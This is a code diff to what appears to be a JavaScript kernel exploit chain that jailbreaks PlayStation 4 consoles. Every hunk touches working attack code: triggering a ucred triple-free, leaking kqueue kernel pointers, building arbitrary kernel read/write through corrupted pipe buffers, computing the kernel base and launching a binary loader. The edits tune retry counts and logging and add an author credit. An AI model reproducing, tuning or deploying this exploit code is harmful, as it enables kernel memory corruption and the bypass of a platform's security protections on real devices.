@@ -929,10 +929,11 @@ function netctrl_exploit() {
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
-    log('Unsupported firmware — exploit aborted.');
     return;
   }
   log('Setting up exploit...');
+  log('Stability by M.ELHOUT');
+
   exploit_end = false;
   exploit_count = 0;
   yield_to_render(exploit_phase_setup);
@@ -940,19 +941,15 @@ function netctrl_exploit() {
 function exploit_phase_setup() {
   setup();
   log('Workers spawned');
-  exploit_count = 0;
-  exploit_end = false;
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W');
-    log('Restart your ps4 ########');
+    log('Failed Restart your ps4 ########');
     cleanup();
     return;
   }
   exploit_count++;
-  log('Triggering ..... ');
   if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
@@ -961,19 +958,16 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
+
   var leak_ok = leak_kqueue_safe();
   if (!leak_ok) {
-    log('Leaking Failed.# Retry triggering...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  // لو leak نجح
-  log('Leaking success.');
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
-  log('Stability by M.ELHOUT');
+  setup_arbitrary_rw();
   yield_to_render(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
@@ -993,34 +987,28 @@ function safe_fhold_fd(fd, label) {
 }
 function setup_arbitrary_rw() {
   if (kq_fdp.eq(0)) {
-    log('Invalid kq_fdp');
-    throw new Error('rw_fail');
+    throw new Error('kq_fdp_fail');
   }
   var fd_files = kreadslow64_safe(kq_fdp);
   if (fd_files.eq(BigInt_Error)) {
-    log('fd_files leak failed');
-    throw new Error('rw_fail');
+    throw new Error('fd_files leak_fail');
   }
   fdt_ofiles = fd_files;
   if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
-    log('Invalid pipe fds');
-    throw new Error('rw_fail');
+    throw new Error('pipe0_fail');
   }
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    log('Pipe file leak failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipe leak1_fail');
   }
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    log('Pipe data leak failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipe leak2_fail');
   }
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    log('Invalid pipe data');
-    throw new Error('rw_fail');
+    throw new Error('pipe data_fail');
   }
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
@@ -1029,8 +1017,7 @@ function setup_arbitrary_rw() {
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
   if (ret_write.eq(BigInt_Error)) {
-    log('Pipebuf write failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipebuf write_fail');
   }
   safe_fhold_fd(master_pipe[0], 'master_pipe[0]');
   safe_fhold_fd(master_pipe[1], 'master_pipe[1]');
@@ -1052,7 +1039,6 @@ function find_allproc() {
   var pipe_0 = master_pipe[0];
   var pipe_1 = master_pipe[1];
   if (pipe_0 < 0 || pipe_1 < 0) {
-    log('find_allproc: invalid master_pipe fds');
     return new BigInt(0);
   }
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
@@ -1116,7 +1102,6 @@ function jailbreak() {
 
   // Calculate kernel base
   if (!kl_lock || kl_lock.eq(0)) {
-    log('jailbreak: kl_lock is invalid');
     throw new Error('kl_lock is invalid');
   }
   kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
@@ -1124,13 +1109,14 @@ function jailbreak() {
 
   // المنطق المشترك حسب الـ FW
   jailbreak_shared(FW_VERSION);
-  log('Jailbreak Complete - JAILBROKEN');
 
   // Cleanup من غير قتل الـ workers بقوة
   cleanup(false);
+  
   show_success();
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
   run_binloader();
+  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
+  
 }
 function fhold(fp) {
   // زيادة f_count مع حراسة بسيطة
@@ -1454,7 +1440,7 @@ function leak_kqueue() {
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
-  var MAX_KQ = 5000;
+  var MAX_KQ = 7000;
   while (count < MAX_KQ) {
     count++;
     kq = kqueue();
@@ -1541,8 +1527,8 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 1500;
-var KWRITE_MAX_UIO_RECLAIM = 1500;
+var KREAD_MAX_UIO_RECLAIM = 1000;
+var KWRITE_MAX_UIO_RECLAIM = 1000;
 
 // IOV reclaim max loops
 var KREAD_MAX_IOV_RECLAIM = 300;
